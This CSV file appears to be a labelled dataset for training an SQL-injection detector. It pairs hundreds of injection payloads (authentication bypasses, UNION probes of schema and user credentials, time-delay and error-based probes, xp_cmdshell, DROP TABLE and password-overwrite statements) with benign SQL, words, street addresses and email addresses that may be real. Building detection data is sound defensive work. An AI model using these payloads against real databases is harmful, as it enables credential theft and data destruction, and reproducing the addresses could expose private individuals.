Sentence,Label
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1157570",1
enseriarse,0
"  SELECT * FROM sometime WHERE pan IN  ( 'slowly', 'climate', 'dangerous' )  ",0
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1494101",1
"' union select null,null,null--# AND 1=1--/*511",1
jane@23horas.ua,0
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
SELECT * FROM progress ORDER BY court DESC,0
SELECT * FROM dance ORDER BY dark,0
26292,0
"1""; WAITFOR DELAY ""00:00:010""--",1
SELECT * FROM widely WHERE standard BETWEEN 'experience' AND 'list',0
1' OR '1' = '1 AND 1=1 AND 1=1/*993960903,1
SELECT Count ( * )  AS health,0
lopiano,0
"admin' UNION SELECT NULL,NULL--#122619",1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 AND 1=1,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=119--",1
admin' OR '1'='1' /* AND 1=1452 AND 1=1252,1
' OR 'a'='a839/*,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198/*236",1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1##",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247 AND 1=1#,1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=138030,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1101",1
"admin"" OR 1=1/*--863 AND 1=1 AND 1=1",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481477 OR 1=1",1
caete,0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556590--",1
"test"" OR ""1""=""1"" /*#/*654118",1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1791301850831,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718#",1
1') OR 1=1----#,1
"  UPDATE whole SET life =  'man', City =  'key' WHERE recall =  valuable",0
SELECT below ( s FROM getting RIGHT JOIN,0
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1140 AND 1=1",1
' OR 1=1#----#723 AND 1=1,1
"1' UNION SELECT 1,2,3-- AND 1=1------",1
admin' OR '1'='1' --604--,1
37576555y,0
SELECT * FROM wp_posts WHERE ID  =  348492 LIMIT 1,0
"1' AND BENCHMARK(10000000,MD10('A'))--",1
'/**/OR/**/1=1----#,1
admin' UNION SELECT NULL-- AND 1=1#645270629237,1
SELECT * FROM chain WHERE education = 'continued' LIMIT 3,0
gen7o,0
' OR 1=1#----# AND 1=1783,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=151580",1
2' OR '2' = '2163254#820688,1
user' OR 1=1# AND 1=1 AND 1=1323,1
xixia,0
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--213",1
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429--,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0
dax-branson@indianabilljaen.kp,0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1978--/*",1
SELECT listen ( s )  FROM courage SELECT eaten FROM his,0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138729 OR 1=1",1
SELECT area ( s )  FROM seems UNION ALL,0
"""/**/OR/**/1=1-- OR 1=1/*85789030",1
' or 2=2/*#--,1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#171",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--",1
106099000000000,0
1940000000000000,0
"1"" And sLeep(5)--398",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 OR 1=1475,1
' OR 1=1#----# AND 1=1499,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184 AND 1=1965,1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786532,1
"admin"") OR 1=1-- AND 1=1",1
yaiti,0
caine@albeiteria.es,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198/*727",1
SELECT TOP 50 PERCENT * FROM town SELECT * FROM please FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM now,0
"user"" UNION SELECT NULL--/*58370752",1
SELECT TOP 3 * FROM sleep WHERE major = 'parallel' SELECT * FROM quarter,0
0x27 UNION ALL SELECT NULL--415482/*#/*,1
DELETE FROM married WHERE suppose = 'local',0
admin' OR 1=1/*#104#/*,1
"1' UNION SELECT 1,2,3-- AND 1=1----633",1
falisco,0
"admin1"" OR 1 = 1--/*",1
admin%2527--215140,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600--611",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*202",1
%27%20UNION%20SELECT%20NULL-- AND 1=1,1
"admin' UNION SELECT NULL,NULL,NULL----/*",1
SELECT * FROM mighty WHERE Price NOT BETWEEN 10 AND 20,0
8a92rique46,0
') OR ('1'='1/* OR 1=1--/*885#,1
%27%29%20OR%201%3D1--35,1
"user1' UNION SELECT NULL,table_name FROM information_schema.tables--#",1
SELECT * FROM never WHERE at = 'level',0
admin' UNION SELECT NULL-- AND 1=1#645/*735909850,1
""" OR 1=1#----#184137850",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236593/*",1
"SELECT * FROM low WHERE money BETWEEN ""effort"" AND    ""favorite""",0
1' UNION ALL SELECT NULL-- AND 1=1,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/*842,1
"1""%09AND%09pg_sleep(5)--860 OR 1=125816##",1
SELECT AVG ( refused ) FROM check,0
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247 AND 1=124,1
' OR '2'='2 AND 1=1 AND 1=1--173--658699,1
SELECT COUNT ( fall ) FROM gift,0
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*889,1
SELECT * FROM  ( SELECT tie FROM leather ) ,0
azuqueca de henares,0
%27%20OR%20%27a%27%3D%27a/*--#344,1
vilassar de mar,0
SELECT * FROM running WHERE    NOT rocky = 'involved',0
SELECT * FROM enemy WHERE printed NOT BETWEEN 'house' AND 'knew',0
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282",1
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes',0
9654,0
"  SELECT angryID AS ID, hurried AS across FROM copy",0
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827--",1
DELETE FROM made,0
3192910000000000,0
"1"" OR ""1"" = ""1 AND 1=1742395401386",1
"0x27 UNION SELECT NULL,NULL,NULL--463#",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*453",1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1 AND 1=1/*#",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827/* OR 1=1",1
'/**/OR/**/1=1-- OR 1=1876-- AND 1=1769 AND 1=1,1
SELECT * FROM cup WHERE care BETWEEN '1996-07-01' AND '1996-07-31',0
admin0x27/* OR 1=1 AND 1=1298542,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679 AND 1=1",1
"""/**/OR/**/""a""=""a922210587",1
fortner,0
"99"" OR 99 = 99 OR 1=1# OR 1=1864",1
' UNION SELECT NULL--/*35,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1990",1
"useradmin"" OR ""1""=""1-- OR 1=1#",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1977",1
' OR '2'='213/*# OR 1=1822 AND 1=1319,1
0x27; DROP TABLE users--15261604,1
""")+OR+(""1""=""1 AND 1=1875885",1
"   SELECT diagram, early, curious FROM chemical WHERE huge  IS NULL",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28614 )  ORDER BY meta_id ASC",0
admin') OR 1=1--#,1
2' AND SLEEP(5)--#669839,1
"""+OR+""1""=""1--959630",1
cusell vinageras,0
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--,1
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1 AND 1=1#",1
"admin""/**/OR/**/1=1-- OR 1=1780",1
boix machiavelli,0
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##744",1
"admin1"" OR ""1"" = ""1# AND 1=1#-- AND 1=1",1
1%27%20OR%20%271%27%20%3D%20%271/*805,1
""" UNION SELECT NULL--/*622/*427/*515146",1
robin@comerciosdeaspe.info,0
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1704373813",1
1' OR '1'='1' --/*612 AND 1=1# AND 1=114,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953949",1
"ADMIN""/*17253168--",1
SELECT * FROM ten WHERE main NOT LIKE 'sets%',0
admin' UNION ALL SELECT NULL--892 OR 1=1957470,1
SELECT column_name FROM table_name WHERE EXISTS,0
"testadmin"" OR ""1""=""1 AND 1=1613186499--",1
"""+OR+""1""=""1--720860",1
"1"" UNION SELECT NULL,NULL------611--/*647",1
graydon,0
florestano,0
' OR 1=1#/* AND 1=1423,1
"' union select null,null,null--55285",1
""";+EXEC+xp_cmdshell(""dir"")--##876",1
SELECT atmosphere ( s FROM thread RIGHT JOIN,0
19219,0
"azorin, 167",0
SELECT TOP 3 * FROM support,0
user' OR 1=1--/*41,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878## AND 1=1",1
"0x27 UNION SELECT NULL,NULL,NULL-- OR 1=1 OR 1=1#409",1
"   SELECT earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich AS arrow  FROM higher",0
"""%20or%201=1/*",1
SELECT * FROM individual WHERE slip  BETWEEN 10 AND 20,0
""" OR 1=1#----## AND 1=1754/*",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1164/*",1
test' OR '1'='1 AND 1=1--930,1
admin'/**/OR/**/1=1-- OR 1=1402 OR 1=1593,1
' or 2=2--#46828 OR 1=1 AND 1=1,1
""" OR 1=1#----# AND 1=1-- AND 1=1777708",1
48707568p,0
doralie,0
"INSERT INTO town  ( off, principal, back )  VALUES  ( 'chose', 'missing', 'transportation' )  ",0
SELECT * FROM stared WHERE bottom = 'grandmother' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM doing,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1838",1
"   SELECT grabbed,ten,clay,almost,one     (  (  cake JOIN cattle ON steep.worried =  not.seeing )   INNER JOIN stormON Orders.did =  film.wrappedID ) ",0
5203670000000000,0
45183,0
"adminadmin"" OR ""1""=""1/*--/*217 OR 1=1 OR 1=1 OR 1=1",1
'+OR+1=1#/*#,1
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0
"test' UNION SELECT NULL,NULL--/* AND 1=1--265",1
hoste ustrell,0
admin'/*451446407,1
admin' OR 1=1#177633378,1
' or 1=1----685526 AND 1=1,1
'/**/or/**/1=1/*135--##,1
1'/**/AND/**/pg_sleep(5)--302,1
""" OR 1=1#----# AND 1=1-- AND 1=1 AND 1=1230",1
' or 2=2/*# AND 1=1,1
' or 2=2----973,1
"calle toronja, 157",0
DELETE FROM grown,0
"fernandez latorre 14,",0
"11"" OR 1 = 1/*--# OR 1=1",1
1.82575E+015,0
10x27; WAITFOR DELAY 0x2700:00:050x27----928753265,1
"user"") OR (""1""=""1 AND 1=1626844",1
admin' OR '1'='1946#540976,1
timms,0
')+OR+('1'='1 AND 1=187544275,1
DELETE FROM weight,0
1'%20AND%20pg_sleep(5)--533872437458451,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1174/*",1
user' OR 'a'='a----665,1
calle nieto 41,0
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728146119,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198650437",1
SELECT baby ( s )  FROM floating LEFT JOIN,0
16630,0
"   SELECT sweet, went, carefully FROM difficulty WHERE wonderful  IS NULL",0
condal talero,0
SELECT cool FROM repeat UNION SELECT become FROM married ORDER BY visit,0
9ig7a2i4,0
tripicallero,0
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306239",1
ji-chuu,0
medel pujolriu,0
"user"") OR 1=1-- AND 1=1882350307# OR 1=1235",1
SELECT * FROM orange ORDER BY package DESC,0
2821710000000000,0
 UPDATE hand SET open = 'diameter'WHERE widely = 'inside',0
1' OR 'a'='a OR 1=1--,1
'%20or%201=1--969 OR 1=1 OR 1=192620320,1
SELECT * FROM including WHERE alive = 'rice' FETCH FIRST 3 ROWS ONLY,0
admin'/*451 OR 1=1,1
admin' UNION SELECT NULL----607,1
66702102d,0
"INSERT INTO curve  ( pictured, guide, snow )  VALUES  ( 'price', 'saddle', 'market' )  ",0
'%20or%201=1--969 OR 1=1122/*,1
') OR ('1'='1/* OR 1=1--/* AND 1=148,1
1'%20AND%20pg_sleep(5)--533872437458988734,1
""" AND extractvalue(1,concat(0x7e,version()))--/*306",1
afijacin,0
'/**/OR/**/'1'='1'/**/-- OR 1=1575518684,1
"test' UNION SELECT username,password FROM users--/*#/*480",1
"""%20or%201=1-- OR 1=1",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1338,1
1'%20OR%201%20=%201 OR 1=1-- OR 1=1,1
user') OR ('1'='1--#,1
1admin' OR 1=1----,1
1%27%20OR%20%271%27%20%3D%20%271/*155,1
admin' UNION SELECT NULL-- AND 1=1#645/* OR 1=1 AND 1=1,1
'/**/OR/**/'a'='a#,1
SELECT * FROM current  WHERE satellites NOT LIKE '[worker]%',0
calle alqueria de aznar 166,0
"avenida baraain, 51, 1?h",0
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--534",1
"admin"") OR (""1""=""1# OR 1=1171",1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*31",1
1' OR '1'='1' --#412640681329,1
' OR '2'='2753,1
'/**/OR/**/'a'='a922980622971/*381332,1
"admin' UNION SELECT 1,2,3----107",1
"2"" OR ""2"" = ""2163254#/*97#133 AND 1=1400",1
"1"" OR ""a""=""a OR 1=1#38",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190671,1
"""/**/OR/**/1=1-- OR 1=1360",1
'%09OR%091=1--#696,1
' OR 1=1#/*970,1
SELECT * FROM corner WHERE happy = 'orbit'  AND  ( essential = 'draw' OR special = 'brother' ) ,0
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81 OR 1=1",1
"""+OR+""1""=""1--549#",1
"' UNION SELECT 1,2,3--/*#58",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*321,1
" SELECT City, Country FROM Suppliers WHERE Country = 'Germany' ORDER BY City;",0
SELECT Count ( * )  AS army,0
"admin"" UNION SELECT NULL,NULL,NULL--/*517639",1
SELECT AVG ( greater ) FROM weight SELECT SUM ( atom ) ,0
"'/**/UNION/**/SELECT/**/NULL,NULL,NULL--633",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1-- AND 1=1",1
rebes huasequi,0
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600/*",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462,1
SELECT * FROM jungle,0
SELECT shelf ( s )  FROM kill,0
"admin"" UNION SELECT 1,2,3-- AND 1=1957725--",1
admin' OR '1'='1' /*721,1
'; update users set password='hacked'-- AND 1=1,1
admin'/**/OR/**/1=1-- OR 1=1662,1
1' OR '1'='1/* AND 1=1 OR 1=1/*89,1
SELECT COUNT ( government ) FROM powder,0
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=167966423",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1901,1
test' UNION SELECT NULL----##,1
';%20EXEC%20xp_cmdshell('dir')--591956,1
"test' UNION SELECT username,password FROM users-- AND 1=1",1
"   SELECT stranger,studying,minute,process,smaller     (  (  specific JOIN means ON order.loss =  correctly.sort )   INNER JOIN droppedON Orders.plenty =  home.justID ) ",0
pari073l,0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/* AND 1=1",1
plumero,0
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887461310,1
verdusco,0
test' OR '1'='1' /*#666#,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1431,1
admin0x27/*361,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1174--",1
letha,0
SELECT * FROM ride FETCH FIRST 50 PERCENT ROWS ONLY,0
1' UNION SELECT NULL----961,1
"1' UNION SELECT NULL,NULL------ AND 1=1",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928213,1
' OR 99=99#12749,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*#",1
""" AND extractvalue(1,concat(0x7e,version()))--16127274419",1
1' OR '1'='1' --#57#-- OR 1=1,1
"""/**/OR/**/1=1-- OR 1=1 OR 1=1#",1
SELECT Count ( * )  AS giant,0
"1""/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--/*",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892--598#",1
"testadmin"" OR ""1""=""1 AND 1=1613186499119",1
adminadmin' OR '1'='1/*--/*217 AND 1=1 AND 1=1,1
19127,0
'%09UNION%09ALL%09SELECT%09NULL--/*/*/*294792,1
"test' UNION SELECT NULL,NULL,NULL--#",1
SELECT COUNT ( judge )  FROM camp,0
"admin"" OR 1=1--/* OR 1=1301",1
collado villalba,0
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0
"INSERT INTO herd ( softly, rising, storm, claws, bowl, merely )  VALUES  ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )  ",0
57727237c,0
SELECT AVG ( Price ) FROM our,0
SELECT * FROM forward WHERE nation NOT BETWEEN 'tree' AND 'sudden',0
cybolski.doumanian@cortinasartesol.bh,0
ADMIN'/*172620 OR 1=1805,1
"admin1"" OR ""1"" = ""1--/*737/* AND 1=1",1
admin1' OR '1' = '1--/*603#93727295928,1
admin' UNION SELECT NULL-- AND 1=1#645/*735909-- AND 1=1,1
"   SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID ) ",0
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;",0
user1' OR '1' = '1659--443,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*725",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756 OR 1=1",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889688",1
" SELECT column_name ( s )  FROM realize,needed",0
testadmin' OR '1'='1 AND 1=1 OR 1=1398,1
"""/**/OR/**/1=1-- OR 1=1/*857890--",1
"""/**/or/**/1=1/*135534",1
""" OR 1=1#----##--",1
SELECT * FROM to WHERE dull BETWEEN '1996-07-01' AND '1996-07-31',0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=1915110",1
rapariegos,0
"admin"" UNION SELECT 1,2,3-- AND 1=1 OR 1=1----",1
baigent@blueberryminiloaf.com.dj,0
""" OR ""2""=""213 AND 1=1/*",1
test1' OR '1' = '1/*#632797,1
') OR ('1'='1/* OR 1=1--326 AND 1=1/*,1
2' OR '2' = '2163254#52,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377/*",1
%27%20OR%20%27a%27%3D%27a/*--#647,1
"INSERT INTO pick ( tip, could, specific, far, explore, seat )  VALUES  ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )  ",0
test' OR '1'='1 AND 1=1-- AND 1=1,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--24750,1
"calle tiberiades, 90, 8-f",0
82818101t,0
SELECT * FROM corn 3 SELECT * FROM shape,0
SELECT * FROM question ORDER BY essential DESC,0
maycel,0
aimarsen@enla.gi,0
user') OR 1=1-- AND 1=1882350307#--354,1
"  SELECT blind,walk,exciting FROM fastened LEFT JOIN Orders ON heard.sawID =  day.period ORDER BY studied.solid",0
""" OR ""1""=""1 AND 1=1104",1
"admin"" UNION SELECT NULL,NULL--181372",1
SELECT tower ( s )  FROM sometime UNION,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812761",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')--51768",1
larreynaga arce,0
"admin"" UNION ALL SELECT NULL--24127474161/*",1
"testadmin"" OR ""1""=""1 AND 1=1613-- AND 1=1460 AND 1=1",1
admin' OR 1=1#/*327483,1
SELECT * FROM soil FETCH FIRST 3 ROWS ONLY,0
' or 2=2/*367 OR 1=1 OR 1=1 AND 1=1,1
SELECT of ( s ) FROM fact INNER JOIN,0
""" OR ""1""=""1 AND 1=1395454656",1
SELECT eleven ( s FROM nothing RIGHT JOIN,0
"""+UNION+SELECT+NULL,NULL--",1
paisaje,0
"admin' UNION SELECT username,password FROM users-- AND 1=1/* AND 1=1475",1
"  SELECT spell,change FROM was WHERE bread = 'mind' UNION SELECT concerned, success FROM straw",0
"admin' UNION SELECT NULL,NULL,NULL--/*639",1
"user"") OR (""1""=""1 OR 1=1 AND 1=1/* AND 1=1",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#871307,1
' or 2=2--# AND 1=12,1
SELECT TOP 3 * FROM radio SELECT * FROM pipe 3SELECT * FROM quickly,0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*316958",1
'%20or%201=1--969 OR 1=1/*487810,1
ADMIN'/*172620849196607,1
urkiaga,0
SELECT * FROM design WHERE every = 'line',0
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728#,1
' OR '2'='2 AND 1=1 AND 1=1--173--913312,1
SELECT shall FROM better,0
SELECT * FROM ground WHERE origin NOT LIKE '[exciting]%',0
4780720000000001,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198650601--",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1759",1
test' OR 1=1##/*#600281,1
'/**/or/**/1=1/*135540 AND 1=1,1
"1"" UNION SELECT NULL,NULL------611--306493555171",1
FROM  ( SELECT DISTINCT radio FROM iron ) ,0
mccollon@irmedia.ca,0
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1284",1
"user"") OR 1=1-- AND 1=1882350307# OR 1=185",1
SELECT AVG ( copy ) FROM slip SELECT SUM ( valley ) ,0
2' OR '2' = '2163254#506,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1253",1
"' UNION SELECT username,password FROM users-- OR 1=1266",1
') OR ('2'='2 OR 1=1,1
"test"" OR 1=1##933102/*--",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*374216716",1
' UNION SELECT NULL--/*622/*427/*515 OR 1=1 AND 1=1,1
"' union select null,null,null--##723",1
' or 1=1--73991,1
' UNION SELECT NULL--/*622/*427/*25640567704,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4069 )  ORDER BY meta_id ASC",0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#----",1
admin' OR 1=1#/*32775 OR 1=1,1
"test"" UNION SELECT NULL,NULL--/* AND 1=1 AND 1=1",1
"""%20or%201=1# AND 1=1278256",1
almoharn,0
admin1' OR '1' = '1--/*/*814-- OR 1=1707,1
1' UNION SELECT NULL----395225631,1
admin' OR '99'='99 OR 1=171348,1
1'; WAITFOR DELAY '00:00:010'--866#485,1
'+OR+'1'='1-- AND 1=1 AND 1=1/*,1
"""%20or%201=1#428/*61528",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1--,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1--",1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1917,1
';%20WAITFOR%20DELAY%20'0:0:5'--917311,1
""" OR 1=1/*--929888175#298",1
"' union select null,null,null--860 AND 1=1#145",1
"jana, la",0
gowan,0
"1"") OR 1=1----",1
"1"" UNION SELECT NULL,NULL------611--213398",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309995,1
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,0
admin' OR 1=1-- AND 1=1--,1
SELECT AVG ( thee ) FROM language SELECT SUM ( friend ) ,0
17488,0
admin1' OR '1' = '1#706,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184#,1
SELECT * FROM tears WHERE difference NOT LIKE 'track%',0
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1 OR 1=1",1
test' OR '1'='1' /*#666--112,1
monteys bold,0
persson_mcclanahan@deseoun.km,0
1'%20OR%201%20=%201 OR 1=1312,1
"""/**/OR/**/1=1-- OR 1=1 OR 1=1 OR 1=1",1
'%20or%201=1/*835257/* OR 1=1/*250318,1
SELECT * FROM plus WHERE close BETWEEN 'army' AND 'thee',0
ADMIN'/*172620 OR 1=1116,1
1%27%20OR%20%271%27%20%3D%20%271/* OR 1=1,1
""" UNION SELECT NULL,NULL,NULL--/*/*",1
SELECT COUNT ( general ) FROM carefully,0
' OR '1'='1' /*#-- AND 1=1,1
SELECT * FROM bend FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM melted WHERE Price NOT BETWEEN 10 AND 20,0
dormer,0
SELECT * FROM clear WHERE slipped = 'building'  OR aware = 'colony',0
"  SELECT root AS hunt, long AS [birth]  FROM attention",0
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--/*",1
admin%27%20OR%20%271%27%3D%27120# OR 1=1,1
""" UNION SELECT username,password FROM users-- OR 1=1-- OR 1=178",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#772,1
SELECT * FROM trade  WHERE captured NOT LIKE '[mostly]%',0
SELECT AVG ( hospital ) FROM crop,0
'%09UNION%09ALL%09SELECT%09NULL--/* OR 1=1105,1
admin') OR ('1'='1--,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=174",1
'%09UNION%09ALL%09SELECT%09NULL--/*,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1,1
" SELECT column_name ( s )  FROM seat,labor",0
SELECT itself ( s )  FROM grandfather FULL OUTER JOIN,0
2' AND pg_sleep(5)--,1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#381",1
SELECT * FROM wealth 3 SELECT * FROM mail,0
admin' OR '1'='1 AND 1=1998921,1
"1'/**/AND/**/BENCHMARK(5000000,MD5('A'))--# OR 1=1",1
"  SELECT Orders.hellorID, Employees.usual, Employees.reader FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.serviceID ORDER BY Orders.fightingID",0
' UNION ALL SELECT NULL--#/*853#,1
"1"" UNION SELECT NULL----159334593107 AND 1=1#",1
' or 1=1--73843--,1
1'%20OR%201%20=%201319,1
SELECT AVG ( several ) FROM buffalo,0
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739##600",1
"1"" UNION SELECT NULL----395/* AND 1=1228931674",1
'/**/OR/**/'1'='1'/**/--38129,1
"useradmin"" OR 1=1------",1
SELECT * FROM  ( SELECT his FROM baseball ) ,0
'%09UNION%09ALL%09SELECT%09NULL--477#,1
